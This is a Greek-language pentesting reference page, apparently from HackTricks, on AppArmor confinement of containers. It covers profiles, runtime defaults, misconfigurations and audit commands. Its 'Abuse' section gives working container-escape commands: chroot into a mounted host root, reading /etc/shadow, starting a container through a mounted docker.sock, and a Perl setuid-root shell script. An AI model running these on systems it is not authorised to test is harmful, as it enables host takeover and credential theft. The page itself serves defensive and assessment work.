# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Το AppArmor είναι ένα σύστημα **Mandatory Access Control** που επιβάλλει περιορισμούς μέσω προφίλ ανά πρόγραμμα. Σε αντίθεση με τους παραδοσιακούς ελέγχους DAC, οι οποίοι εξαρτώνται σε μεγάλο βαθμό από την ιδιοκτησία χρηστών και ομάδων, το AppArmor επιτρέπει στον kernel να επιβάλλει μια πολιτική που είναι συνδεδεμένη με την ίδια τη διεργασία. Σε περιβάλλοντα container, αυτό έχει σημασία επειδή ένα workload μπορεί να έχει αρκετά παραδοσιακά προνόμια ώστε να επιχειρήσει μια ενέργεια, αλλά και πάλι να απορριφθεί, επειδή το προφίλ AppArmor δεν επιτρέπει τη σχετική διαδρομή, συμπεριφορά mount, συμπεριφορά δικτύου ή χρήση capability.

Το σημαντικότερο εννοιολογικό σημείο είναι ότι το AppArmor βασίζεται σε **διαδρομές**. Αξιολογεί την πρόσβαση στο σύστημα αρχείων μέσω κανόνων διαδρομών και όχι μέσω labels, όπως κάνει το SELinux. Αυτό το καθιστά προσιτό και ισχυρό, αλλά σημαίνει επίσης ότι τα bind mounts και οι εναλλακτικές διατάξεις διαδρομών χρειάζονται προσεκτική εξέταση. Αν το ίδιο περιεχόμενο του host γίνει προσβάσιμο μέσω διαφορετικής διαδρομής, η επίδραση της πολιτικής ενδέχεται να μην είναι αυτή που περίμενε αρχικά ο χειριστής.

## Role In Container Isolation

Οι αξιολογήσεις ασφάλειας container συχνά περιορίζονται στα capabilities και στο seccomp, όμως το AppArmor εξακολουθεί να έχει σημασία και μετά από αυτούς τους ελέγχους. Φανταστείτε ένα container με περισσότερα προνόμια από όσα θα έπρεπε ή ένα workload που χρειαζόταν ένα επιπλέον capability για λειτουργικούς λόγους. Το AppArmor μπορεί και πάλι να περιορίσει την πρόσβαση σε αρχεία, τη συμπεριφορά mount, τη δικτύωση και τα μοτίβα εκτέλεσης, αποτρέποντας την προφανή οδό κατάχρησης. Γι’ αυτό, η απενεργοποίηση του AppArmor «μόνο και μόνο για να λειτουργήσει η εφαρμογή» μπορεί αθόρυβα να μετατρέψει μια απλώς επικίνδυνη ρύθμιση σε μια ρύθμιση που είναι ενεργά εκμεταλλεύσιμη.

## Lab

Για να ελέγξετε αν το AppArmor είναι ενεργό στον host, χρησιμοποιήστε:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Για να δείτε υπό ποιο προφίλ εκτελείται η τρέχουσα διεργασία του container:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Η διαφορά είναι διδακτική. Στη συνηθισμένη περίπτωση, η διεργασία θα πρέπει να εμφανίζει ένα context AppArmor συνδεδεμένο με το profile που επέλεξε το runtime. Στην περίπτωση χωρίς περιορισμούς, αυτό το επιπλέον επίπεδο περιορισμών εξαφανίζεται.

Μπορείτε επίσης να ελέγξετε τι πιστεύει το Docker ότι εφάρμοσε:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Χρήση κατά τον χρόνο εκτέλεσης

Το Docker μπορεί να εφαρμόσει ένα προεπιλεγμένο ή προσαρμοσμένο προφίλ AppArmor όταν το υποστηρίζει το host. Το Podman μπορεί επίσης να ενσωματωθεί με το AppArmor σε συστήματα που βασίζονται στο AppArmor, αν και σε διανομές που δίνουν προτεραιότητα στο SELinux, συχνά έχει μεγαλύτερο ρόλο το άλλο σύστημα MAC. Το Kubernetes μπορεί να εκθέσει πολιτική AppArmor στο επίπεδο του workload σε κόμβους που πράγματι υποστηρίζουν AppArmor. Τα LXC και σχετικά περιβάλλοντα system-container της οικογένειας Ubuntu χρησιμοποιούν επίσης εκτενώς το AppArmor.

Το πρακτικό συμπέρασμα είναι ότι το AppArmor δεν είναι «λειτουργία του Docker». Είναι λειτουργία του πυρήνα του host, την οποία μπορούν να επιλέξουν να εφαρμόσουν διάφορα runtimes. Αν ο host δεν το υποστηρίζει ή το runtime έχει ρυθμιστεί να εκτελείται χωρίς περιορισμούς, η υποτιθέμενη προστασία ουσιαστικά δεν υπάρχει.

Ειδικά για το Kubernetes, το σύγχρονο API είναι το `securityContext.appArmorProfile`. Από το Kubernetes `v1.30`, τα παλαιότερα beta annotations του AppArmor είναι παρωχημένα. Σε υποστηριζόμενους hosts, το `RuntimeDefault` είναι το προεπιλεγμένο προφίλ, ενώ το `Localhost` παραπέμπει σε ένα προφίλ που πρέπει να έχει ήδη φορτωθεί στον κόμβο. Αυτό έχει σημασία κατά την αξιολόγηση, επειδή ένα manifest μπορεί να φαίνεται ότι λαμβάνει υπόψη το AppArmor, ενώ στην πραγματικότητα εξαρτάται πλήρως από την υποστήριξη του κόμβου και τα προφορτωμένα προφίλ.<sup>[[1]](#references)</sup>

Μια λεπτή αλλά χρήσιμη λειτουργική λεπτομέρεια είναι ότι ο ρητός ορισμός του `appArmorProfile.type: RuntimeDefault` είναι αυστηρότερος από την απλή παράλειψη του πεδίου. Αν το πεδίο οριστεί ρητά και ο κόμβος δεν υποστηρίζει AppArmor, η διαδικασία admission θα πρέπει να αποτύχει. Αν παραλειφθεί, το workload μπορεί και πάλι να εκτελεστεί σε κόμβο χωρίς AppArmor, απλώς χωρίς αυτό το επιπλέον επίπεδο περιορισμού. Από τη σκοπιά ενός επιτιθέμενου, αυτός είναι ένας καλός λόγος να ελέγχει τόσο το manifest όσο και την πραγματική κατάσταση του κόμβου.<sup>[[1]](#references)</sup>

Σε hosts με AppArmor που υποστηρίζουν Docker, το πιο γνωστό προεπιλεγμένο προφίλ είναι το `docker-default`. Αυτό το προφίλ δημιουργείται από το πρότυπο AppArmor του Moby και είναι σημαντικό, επειδή εξηγεί γιατί ορισμένα PoCs που βασίζονται σε capabilities εξακολουθούν να αποτυγχάνουν σε ένα προεπιλεγμένο container. Σε γενικές γραμμές, το `docker-default` επιτρέπει τη συνήθη δικτύωση, απαγορεύει εγγραφές σε μεγάλο μέρος του `/proc`, αρνείται την πρόσβαση σε ευαίσθητα τμήματα του `/sys`, αποκλείει λειτουργίες mount και περιορίζει το ptrace, ώστε να μην αποτελεί γενικό μηχανισμό διερεύνησης του host. Η κατανόηση αυτής της βασικής συμπεριφοράς βοηθά να διακρίνουμε το «το container έχει `CAP_SYS_ADMIN`» από το «το container μπορεί πράγματι να χρησιμοποιήσει αυτό το capability απέναντι στις διεπαφές του πυρήνα που με ενδιαφέρουν».

## Διαχείριση προφίλ

Τα προφίλ AppArmor αποθηκεύονται συνήθως στο `/etc/apparmor.d/`. Μια συνηθισμένη σύμβαση ονοματοδοσίας είναι η αντικατάσταση των καθέτων στη διαδρομή του εκτελέσιμου με τελείες. Για παράδειγμα, ένα προφίλ για το `/usr/bin/man` αποθηκεύεται συνήθως ως `/etc/apparmor.d/usr.bin.man`. Αυτή η λεπτομέρεια έχει σημασία τόσο για την άμυνα όσο και για την αξιολόγηση, επειδή, μόλις γνωρίζετε το όνομα του ενεργού προφίλ, συχνά μπορείτε να εντοπίσετε γρήγορα το αντίστοιχο αρχείο στον host.

Χρήσιμες εντολές διαχείρισης στην πλευρά του host περιλαμβάνουν:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Ο λόγος που αυτές οι εντολές είναι σημαντικές σε μια αναφορά για την ασφάλεια των containers είναι ότι εξηγούν πώς δημιουργούνται και φορτώνονται στην πράξη τα profiles, πώς αλλάζουν σε λειτουργία παραπόνων και πώς τροποποιούνται μετά από αλλαγές στην εφαρμογή. Αν ένας διαχειριστής συνηθίζει να θέτει τα profiles σε λειτουργία παραπόνων κατά την αντιμετώπιση προβλημάτων και ξεχνά να επαναφέρει την επιβολή, το container μπορεί να φαίνεται προστατευμένο στην τεκμηρίωση, ενώ στην πράξη λειτουργεί με πολύ πιο χαλαρούς περιορισμούς.

### Δημιουργία και ενημέρωση profiles

Το `aa-genprof` μπορεί να παρακολουθεί τη συμπεριφορά μιας εφαρμογής και να βοηθά στη διαδραστική δημιουργία ενός profile:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

Το `aa-easyprof` μπορεί να δημιουργήσει ένα πρότυπο προφίλ που μπορεί αργότερα να φορτωθεί με το `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Όταν αλλάζει το binary και χρειάζεται ενημέρωση της policy, το `aa-logprof` μπορεί να αναπαράγει τις απορρίψεις που εντοπίζει στα logs και να βοηθήσει τον χειριστή να αποφασίσει αν θα τις επιτρέψει ή θα τις απορρίψει:

```bash
sudo aa-logprof
```

### Καταγραφές

Οι αρνήσεις του AppArmor είναι συχνά ορατές μέσω των `auditd`, `syslog` ή εργαλείων όπως το `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Αυτό είναι χρήσιμο τόσο επιχειρησιακά όσο και επιθετικά. Οι defenders το χρησιμοποιούν για να βελτιώσουν τα profiles. Οι attackers το χρησιμοποιούν για να μάθουν ποια ακριβώς διαδρομή ή λειτουργία αποκλείεται και αν το AppArmor είναι ο μηχανισμός ελέγχου που εμποδίζει μια αλυσίδα exploit.

### Εντοπισμός του ακριβούς αρχείου profile

Όταν ένα runtime εμφανίζει το όνομα συγκεκριμένου profile AppArmor για ένα container, συχνά είναι χρήσιμο να αντιστοιχίσετε αυτό το όνομα με το αρχείο profile στον δίσκο:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Αυτό είναι ιδιαίτερα χρήσιμο κατά τον έλεγχο από την πλευρά του host, επειδή γεφυρώνει το χάσμα ανάμεσα στο «το container αναφέρει ότι εκτελείται με το profile `lowpriv`» και στο «οι πραγματικοί κανόνες βρίσκονται σε αυτό το συγκεκριμένο αρχείο, το οποίο μπορεί να ελεγχθεί ή να φορτωθεί ξανά».

### Κανόνες Υψηλής Σημασίας Προς Έλεγχο

Όταν μπορείτε να διαβάσετε ένα profile, μην περιορίζεστε σε απλές γραμμές `deny`. Αρκετοί τύποι κανόνων επηρεάζουν ουσιαστικά το πόσο αποτελεσματικό θα είναι το AppArmor απέναντι σε μια απόπειρα διαφυγής από container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: εκτελεί το δυαδικό αρχείο-στόχο χωρίς περιορισμούς. Αν επιτρέπεται η πρόσβαση σε κάποιο προσβάσιμο βοηθητικό πρόγραμμα, shell ή interpreter μέσω `ux`, αυτό είναι συνήθως το πρώτο πράγμα που πρέπει να δοκιμάσετε.
- `px` / `Px` και `cx` / `Cx`: πραγματοποιούν μεταβάσεις profile κατά την εκτέλεση. Δεν είναι αυτομάτως κακές, αλλά αξίζει να ελεγχθούν, επειδή η μετάβαση μπορεί να οδηγήσει σε profile με πολύ ευρύτερα δικαιώματα από το τρέχον.
- `change_profile`: επιτρέπει σε μια εργασία να μεταβεί σε άλλο φορτωμένο profile, αμέσως ή κατά την επόμενη εκτέλεση. Αν το profile προορισμού είναι ασθενέστερο, αυτό μπορεί να γίνει η προβλεπόμενη οδός διαφυγής από έναν περιοριστικό τομέα.
- `flags=(complain)`, `flags=(unconfined)` ή τα νεότερα `flags=(prompt)`: θα πρέπει να επηρεάζουν το πόση εμπιστοσύνη δείχνετε στο profile. Το `complain` καταγράφει τις αρνήσεις αντί να τις επιβάλλει, το `unconfined` καταργεί το όριο ασφαλείας και το `prompt` εξαρτάται από μια διαδρομή απόφασης στον userspace αντί για άρνηση που επιβάλλεται αποκλειστικά από τον kernel.
- `userns` ή `userns create,`: οι νεότερες πολιτικές του AppArmor μπορούν να ελέγχουν τη δημιουργία user namespaces. Αν ένα profile container το επιτρέπει ρητά, τα ένθετα user namespaces παραμένουν διαθέσιμα, ακόμη κι όταν η πλατφόρμα χρησιμοποιεί το AppArmor ως μέρος της στρατηγικής ενίσχυσης της ασφάλειας.

Χρήσιμη εντολή `grep` από την πλευρά του host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Αυτός ο τύπος ελέγχου είναι συχνά πιο χρήσιμος από το να κοιτάζετε εκατοντάδες συνηθισμένους κανόνες αρχείων. Αν ένα breakout βασίζεται στην εκτέλεση ενός helper, στην είσοδο σε ένα νέο namespace ή στη διαφυγή σε ένα λιγότερο περιοριστικό profile, η απάντηση συχνά κρύβεται σε αυτούς τους κανόνες που αφορούν μεταβάσεις και όχι στις προφανείς γραμμές τύπου `deny /etc/shadow r`.

## Misconfigurations

Το πιο προφανές λάθος είναι το `apparmor=unconfined`. Οι διαχειριστές συχνά το ορίζουν κατά τον εντοπισμό σφαλμάτων μιας εφαρμογής, όταν το profile έχει αποκλείσει σωστά κάτι επικίνδυνο ή μη αναμενόμενο. Αν η σημαία παραμείνει σε production, ολόκληρο το επίπεδο MAC έχει ουσιαστικά αφαιρεθεί.

Ένα άλλο πιο λεπτό πρόβλημα είναι η υπόθεση ότι τα bind mounts είναι ακίνδυνα επειδή τα δικαιώματα των αρχείων φαίνονται φυσιολογικά. Επειδή το AppArmor βασίζεται σε paths, η έκθεση paths του host σε εναλλακτικές τοποθεσίες mount μπορεί να αλληλεπιδράσει αρνητικά με τους κανόνες paths. Ένα τρίτο λάθος είναι να ξεχνά κανείς ότι ένα όνομα profile σε ένα αρχείο ρυθμίσεων δεν σημαίνει πολλά, αν ο kernel του host δεν επιβάλλει στην πράξη το AppArmor.

## Abuse

Όταν το AppArmor απουσιάζει, λειτουργίες που προηγουμένως περιορίζονταν μπορεί ξαφνικά να πετύχουν: ανάγνωση ευαίσθητων paths μέσω bind mounts, πρόσβαση σε τμήματα του procfs ή του sysfs που θα έπρεπε να παραμένουν δυσκολότερα προσβάσιμα, εκτέλεση ενεργειών που σχετίζονται με mount, αν το επιτρέπουν επίσης τα capabilities/seccomp, ή χρήση paths που κανονικά θα απαγόρευε ένα profile. Το AppArmor είναι συχνά ο μηχανισμός που εξηγεί γιατί μια απόπειρα breakout βασισμένη σε capabilities «θα έπρεπε να λειτουργεί» θεωρητικά, αλλά στην πράξη αποτυγχάνει. Αφαιρέστε το AppArmor και η ίδια απόπειρα μπορεί να αρχίσει να πετυχαίνει.

Αν υποψιάζεστε ότι το AppArmor είναι ο κύριος λόγος που αποτρέπεται μια αλυσίδα abuse βασισμένη σε path-traversal, bind mount ή mount, το πρώτο βήμα είναι συνήθως να συγκρίνετε τι γίνεται προσβάσιμο με και χωρίς profile. Για παράδειγμα, αν ένα path του host είναι mounted μέσα στο container, ξεκινήστε ελέγχοντας αν μπορείτε να το διατρέξετε και να το διαβάσετε:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Αν το container διαθέτει επίσης ένα επικίνδυνο capability όπως το `CAP_SYS_ADMIN`, ένας από τους πιο πρακτικούς ελέγχους είναι να διαπιστώσετε αν το AppArmor είναι ο μηχανισμός ελέγχου που εμποδίζει τις λειτουργίες mount ή την πρόσβαση σε ευαίσθητα filesystems του kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Σε περιβάλλοντα όπου μια διαδρομή του host είναι ήδη διαθέσιμη μέσω bind mount, η απώλεια του AppArmor μπορεί επίσης να μετατρέψει ένα ζήτημα αποκάλυψης πληροφοριών μόνο για ανάγνωση σε άμεση πρόσβαση σε αρχεία του host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Ο σκοπός αυτών των εντολών δεν είναι ότι το AppArmor από μόνο του προκαλεί το breakout. Είναι ότι μόλις αφαιρεθεί το AppArmor, πολλές διαδρομές κατάχρησης που βασίζονται στο filesystem και στα mount γίνονται αμέσως δοκιμάσιμες.

### Πλήρες παράδειγμα: Το AppArmor είναι απενεργοποιημένο + το root του host είναι προσαρτημένο

Αν το root του host είναι ήδη προσαρτημένο στο container μέσω bind mount στο `/host`, η αφαίρεση του AppArmor μπορεί να μετατρέψει μια αποκλεισμένη διαδρομή κατάχρησης του filesystem σε πλήρες host escape:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Μόλις το shell εκτελείται μέσω του filesystem του host, το workload έχει ουσιαστικά διαφύγει από το όριο του container:

```bash
id
hostname
cat /etc/shadow | head
```

### Πλήρες Παράδειγμα: AppArmor Απενεργοποιημένο + Runtime Socket

Αν το πραγματικό εμπόδιο ήταν το AppArmor γύρω από την κατάσταση runtime, ένα προσαρτημένο socket μπορεί να αρκεί για πλήρη διαφυγή:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Η ακριβής διαδρομή εξαρτάται από το σημείο προσάρτησης, αλλά το αποτέλεσμα είναι το ίδιο: το AppArmor δεν εμποδίζει πλέον την πρόσβαση στο API του runtime, και το API του runtime μπορεί να εκκινήσει ένα container που θέτει σε κίνδυνο τον host.

### Πλήρες παράδειγμα: Παράκαμψη Bind-Mount βάσει διαδρομής

Επειδή το AppArmor βασίζεται σε διαδρομές, η προστασία του `/proc/**` δεν προστατεύει αυτόματα το ίδιο περιεχόμενο του procfs του host, όταν είναι προσβάσιμο μέσω διαφορετικής διαδρομής:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Ο αντίκτυπος εξαρτάται από το τι ακριβώς έχει προσαρτηθεί και από το αν η εναλλακτική διαδρομή παρακάμπτει επίσης άλλους ελέγχους, αλλά αυτό το μοτίβο είναι ένας από τους σαφέστερους λόγους για τους οποίους το AppArmor πρέπει να αξιολογείται σε συνδυασμό με τη διάταξη των mount και όχι μεμονωμένα.

### Πλήρες παράδειγμα: παράκαμψη shebang

Το AppArmor μπορεί να επισυνάψει ένα προφίλ στη διαδρομή του script που εκτελείται αντί στον interpreter που ορίζεται από το shebang. Αντίθετα, η απευθείας κλήση του interpreter μπορεί να επιλέξει το προφίλ του. Ένας [συντηρητής του AppArmor περιγράφει αυτή τη διάκριση](https://bugs.launchpad.net/apparmor/+bug/1911431). Ένα ιστορικό παράδειγμα αφορούσε ένα script του οποίου η πρώτη γραμμή παρέπεμπε σε έναν περιορισμένο interpreter:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Το παράδειγμα είναι μόνο μια πιθανή περίπτωση όπου το file capability του interpreter μπορεί να ενεργοποιηθεί και το πραγματικό exec attachment του script επιτρέπει τη λειτουργία. Ελέγξτε την φορτωμένη πολιτική και την ετικέτα διεργασίας, το capability bounding set, το `no_new_privs` και την κατάσταση `nosuid` του mount· μόνο το όνομα ενός αρχείου προφίλ ή μια καταχώριση `cap_setuid+ep` δεν αποδεικνύει ότι είναι εφικτή κάποια μετάβαση. Οι αλυσίδες interpreter και οι εναλλακτικές διαδρομές εκτέλεσης χρειάζονται ξεχωριστό έλεγχο.

## Έλεγχοι

Στόχος αυτών των ελέγχων είναι να απαντήσουν γρήγορα σε τρία ερωτήματα: είναι ενεργοποιημένο το AppArmor στον host, περιορίζεται η τρέχουσα διεργασία και εφάρμοσε πράγματι το runtime κάποιο προφίλ σε αυτό το container;

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Τι είναι ενδιαφέρον εδώ:

- Αν το `/proc/self/attr/current` εμφανίζει `unconfined`, το workload δεν επωφελείται από τον περιορισμό του AppArmor.
- Αν το `aa-status` εμφανίζει ότι το AppArmor είναι απενεργοποιημένο ή δεν έχει φορτωθεί, οποιοδήποτε όνομα profile υπάρχει στη ρύθμιση runtime είναι σε μεγάλο βαθμό διακοσμητικό.
- Αν το `docker inspect` εμφανίζει `unconfined` ή ένα μη αναμενόμενο custom profile, αυτός είναι συχνά ο λόγος που λειτουργεί μια διαδρομή κατάχρησης μέσω filesystem ή mount.
- Αν το `/sys/kernel/security/apparmor/profiles` δεν περιέχει το profile που περιμένατε, η ρύθμιση του runtime ή του orchestrator από μόνη της δεν αρκεί.
- Αν ένα υποτιθέμενο hardened profile περιέχει κανόνες τύπου `ux`, ευρύ `change_profile`, `userns` ή `flags=(complain)`, το πρακτικό όριο ασφαλείας μπορεί να είναι πολύ ασθενέστερο απ’ όσο υποδηλώνει το όνομα του profile.

Αν ένα container έχει ήδη αυξημένα προνόμια για λειτουργικούς λόγους, η διατήρηση του AppArmor ενεργοποιημένου κάνει συχνά τη διαφορά ανάμεσα σε μια ελεγχόμενη εξαίρεση και σε μια πολύ ευρύτερη αστοχία ασφάλειας.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή σε hosts με υποστήριξη AppArmor | Χρησιμοποιεί το profile AppArmor `docker-default`, εκτός αν παρακαμφθεί | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Εξαρτάται από το host | Το AppArmor υποστηρίζεται μέσω του `--security-opt`, αλλά η ακριβής προεπιλογή εξαρτάται από το host/runtime και δεν είναι τόσο καθολική όσο το τεκμηριωμένο profile `docker-default` του Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Υπό προϋποθέσεις, ενεργοποιημένο από προεπιλογή | Αν δεν οριστεί το `appArmorProfile.type`, η προεπιλογή είναι `RuntimeDefault`, αλλά εφαρμόζεται μόνο όταν το AppArmor είναι ενεργοποιημένο στον node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` με ασθενές profile, nodes χωρίς υποστήριξη AppArmor |
| containerd / CRI-O under Kubernetes | Ακολουθεί την υποστήριξη του node/runtime | Τα runtimes που υποστηρίζονται συνήθως από το Kubernetes υποστηρίζουν το AppArmor, αλλά η πραγματική επιβολή εξαρτάται ακόμη από την υποστήριξη του node και τις ρυθμίσεις του workload | Όπως στη γραμμή του Kubernetes· η απευθείας ρύθμιση του runtime μπορεί επίσης να παραλείψει εντελώς το AppArmor |

Για το AppArmor, η σημαντικότερη μεταβλητή είναι συχνά το **host**, όχι μόνο το runtime. Μια ρύθμιση profile σε ένα manifest δεν παρέχει περιορισμό σε έναν node όπου το AppArmor δεν είναι ενεργοποιημένο.
